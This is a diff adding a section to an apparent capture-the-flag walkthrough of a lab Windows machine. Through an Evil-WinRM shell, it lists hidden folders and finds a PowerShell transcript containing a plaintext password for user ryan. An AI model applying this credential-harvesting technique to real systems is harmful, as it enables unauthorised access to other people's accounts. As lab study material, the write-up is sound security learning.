@@ -294,6 +294,131 @@ Mode                LastWriteTime         Length Name
 
 Uploaded `winPEASx64.exe` but did not observe any details of interest.
 
+## Hidden Folders
+
+Can check for hidden folders with `ls -force`:
+
+```bash
+*Evil-WinRM* PS C:\> ls -force
+
+
+    Directory: C:\
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d--hs-        6/22/2024   5:46 AM                $RECYCLE.BIN
+d--hsl        9/25/2019  10:17 AM                Documents and Settings
+d-----        9/25/2019   6:19 AM                PerfLogs
+d-r---        9/25/2019  12:39 PM                Program Files
+d-----       11/20/2016   6:36 PM                Program Files (x86)
+d--h--        9/25/2019  10:48 AM                ProgramData
+d--h--        12/3/2019   6:32 AM                PSTranscripts
+d--hs-        9/25/2019  10:17 AM                Recovery
+d--hs-        9/25/2019   6:25 AM                System Volume Information
+d-r---        12/4/2019   2:46 AM                Users
+d-----        12/4/2019   5:15 AM                Windows
+-arhs-       11/20/2016   5:59 PM         389408 bootmgr
+-a-hs-        7/16/2016   6:10 AM              1 BOOTNXT
+-a-hs-        6/22/2024   4:39 AM      402653184 pagefile.sys
+```
+
+Can see the folder `PSTranscripts` and within this folder, a file titled `PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt`.
+
+```powershell
+**********************
+Windows PowerShell transcript start
+Start time: 20191203063201
+Username: MEGABANK\ryan
+RunAs User: MEGABANK\ryan
+Machine: RESOLUTE (Microsoft Windows NT 10.0.14393.0)
+Host Application: C:\Windows\system32\wsmprovhost.exe -Embedding
+Process ID: 2800
+PSVersion: 5.1.14393.2273
+PSEdition: Desktop
+PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.14393.2273
+BuildVersion: 10.0.14393.2273
+CLRVersion: 4.0.30319.42000
+WSManStackVersion: 3.0
+PSRemotingProtocolVersion: 2.3
+SerializationVersion: 1.1.0.1
+**********************
+Command start time: 20191203063455
+**********************
+PS>TerminatingError(): "System error."
+>> CommandInvocation(Invoke-Expression): "Invoke-Expression"
+>> ParameterBinding(Invoke-Expression): name="Command"; value="-join($id,'PS ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name),'> ')
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+>> CommandInvocation(Out-String): "Out-String"
+>> ParameterBinding(Out-String): name="Stream"; value="True"
+**********************
+Command start time: 20191203063455
+**********************
+PS>ParameterBinding(Out-String): name="InputObject"; value="PS megabank\ryan@RESOLUTE Documents> "
+PS megabank\ryan@RESOLUTE Documents>
+**********************
+Command start time: 20191203063515
+**********************
+PS>CommandInvocation(Invoke-Expression): "Invoke-Expression"
+>> ParameterBinding(Invoke-Expression): name="Command"; value="cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!
+
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+>> CommandInvocation(Out-String): "Out-String"
+>> ParameterBinding(Out-String): name="Stream"; value="True"
+**********************
+Windows PowerShell transcript start
+Start time: 20191203063515
+Username: MEGABANK\ryan
+RunAs User: MEGABANK\ryan
+Machine: RESOLUTE (Microsoft Windows NT 10.0.14393.0)
+Host Application: C:\Windows\system32\wsmprovhost.exe -Embedding
+Process ID: 2800
+PSVersion: 5.1.14393.2273
+PSEdition: Desktop
+PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.14393.2273
+BuildVersion: 10.0.14393.2273
+CLRVersion: 4.0.30319.42000
+WSManStackVersion: 3.0
+PSRemotingProtocolVersion: 2.3
+SerializationVersion: 1.1.0.1
+**********************
+**********************
+Command start time: 20191203063515
+**********************
+PS>CommandInvocation(Out-String): "Out-String"
+>> ParameterBinding(Out-String): name="InputObject"; value="The syntax of this command is:"
+cmd : The syntax of this command is:
+At line:1 char:1
++ cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (The syntax of this command is::String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+cmd : The syntax of this command is:
+At line:1 char:1
++ cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (The syntax of this command is::String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+**********************
+Windows PowerShell transcript start
+Start time: 20191203063515
+Username: MEGABANK\ryan
+RunAs User: MEGABANK\ryan
+Machine: RESOLUTE (Microsoft Windows NT 10.0.14393.0)
+Host Application: C:\Windows\system32\wsmprovhost.exe -Embedding
+Process ID: 2800
+PSVersion: 5.1.14393.2273
+PSEdition: Desktop
+PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.14393.2273
+BuildVersion: 10.0.14393.2273
+CLRVersion: 4.0.30319.42000
+WSManStackVersion: 3.0
+PSRemotingProtocolVersion: 2.3
+SerializationVersion: 1.1.0.1
+**********************
+```
+
+Identified a new set of credentials in the powershell script: `ryan:Serv3r4Admin4cc123!`
 
 
 
